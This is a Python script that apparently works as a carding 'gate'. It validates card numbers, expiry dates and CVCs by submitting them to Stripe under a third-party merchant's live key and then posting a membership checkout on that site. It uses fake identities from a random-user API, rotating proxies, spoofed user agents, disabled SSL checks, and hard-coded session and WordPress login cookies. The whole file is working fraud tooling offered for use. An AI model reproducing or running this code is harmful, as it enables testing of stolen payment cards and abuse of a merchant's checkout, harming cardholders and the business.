import requests
import re
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import Fore, Style
from proxy import reqproxy

def fake_user():
   response = requests.get('https://randomuser.me/api/1.2/?nat=us')
   data = response.text
   name_match = re.search(r'"first":"(.*?)"', data)
   name = name_match.group(1) if name_match else ''
   last_match = re.search(r'"last":"(.*?)"', data)
   last = last_match.group(1) if last_match else ''
   email_match = re.search(r'"email":"(.*?)"', data)
   email = email_match.group(1) if email_match else ''
   street_match = re.search(r'"street":"(.*?)"', data)
   street = street_match.group(1) if street_match else ''
   city_match = re.search(r'"city":"(.*?)"', data)
   city = city_match.group(1) if city_match else ''
   state_match = re.search(r'"state":"(.*?)"', data)
   state = state_match.group(1) if state_match else ''
   phone_match = re.search(r'"phone":"(.*?)"', data)
   phone = phone_match.group(1) if phone_match else ''
   postcode_match = re.search(r'"postcode":(.*?),', data)
   postcode = postcode_match.group(1) if postcode_match else ''
   return name, last, email, street, city, state, phone, postcode

def Tele1(ccx):
    session, ip_address = reqproxy()
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
   
    name, last, email, street, city, state, phone, postcode = fake_user()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=0ed3ead2-6862-4522-94cb-374f5f846bb57c7cef&muid=f2d01d61-4b84-4229-a325-b1b41bf5779a86b5f6&sid=e855bb23-2e73-4734-b4a7-334769d8979bebf10d&payment_user_agent=stripe.js%2F3007153515%3B+stripe-js-v3%2F3007153515%3B+split-card-element&referrer=https%3A%2F%2Fwww.wellnessmadesimple.us&time_on_page=16894&key=pk_live_VwVhcqxB2mJal9kbNAugjzX0'
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
       print(Fore.GREEN + "PM: ",id, "Proxy is Live: ", ip_address, "gatet1" + Style.RESET_ALL)
    except:
           return '#'


# Define the URL and headers
    url = 'https://www.wellnessmadesimple.us/membership-account/membership-checkout/?level=2'

    headers1 = {
       'authority': 'www.wellnessmadesimple.usm',
       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
       'accept-language': 'en-US,en;q=0.9',
       'content-type': 'application/x-www-form-urlencoded',
       'origin': 'https://www.wellnessmadesimple.us',
       'referer': 'https://www.wellnessmadesimple.us/membership-account/membership-checkout/?level=2',
       'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
   
    data2 = {
       'level': '2',
       'checkjavascript': '1',
       'other_discount_code': '',
       'username': name + '007',
       'password': '4400662438466786',
       'password2': '4400662438466786',
       'bemail': email,
       'bconfirmemail_copy': '1',
       'fullname': '',
       'CardType': 'mastercard',
       'discount_code': '',
       'submit-checkout': '1',
       'javascriptok': '1',
       'payment_method_id': id,
       'AccountNumber': 'XXXXXXXXXXXX3134',
       'ExpirationMonth': '02',
       'ExpirationYear': '2026',
    }
    
    cookies = {
    '__stripe_mid': 'f2d01d61-4b84-4229-a325-b1b41bf5779a86b5f6',
    '__stripe_sid': 'e855bb23-2e73-4734-b4a7-334769d8979bebf10d',
    '_ga': 'GA1.2.1781648405.1696856329',
    '_ga_YCTQZK3MHL': 'GS1.1.1696856328.1.1.1696857053.0.0.0',
    '_ga_YJLE6GE62T': 'GS1.1.1696856329.1.1.1696857051.0.0.0',
    '_gat_gtag_UA_199870798_1': '1',
    '_gid': 'GA1.2.2022222147.1696856330',
    'PHPSESSID': 'eb928cck5khui08miiodj04mbd',
    'pmpro_visit': '1',
    'wordpress_logged_in_129d7c16ca7f7cf785d714b26298974f': 'moymoy%7C1698065986%7CbkM1X6lfi3SXmQlP6sp8kkhSQqWcUiunAXDcpW6lGhS%7Cd96062c8eea4a9f75920b97df35eee893194ef4ede1ea39c5951d53faa6bd022'
    }  
    
  
   # Make the POST request
    response = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)  # Note: Set verify=False to disable SSL verification
    try:
       result2 = response.text
    except:
	    return "succeeded"
    return result2
print("working gatet 1")
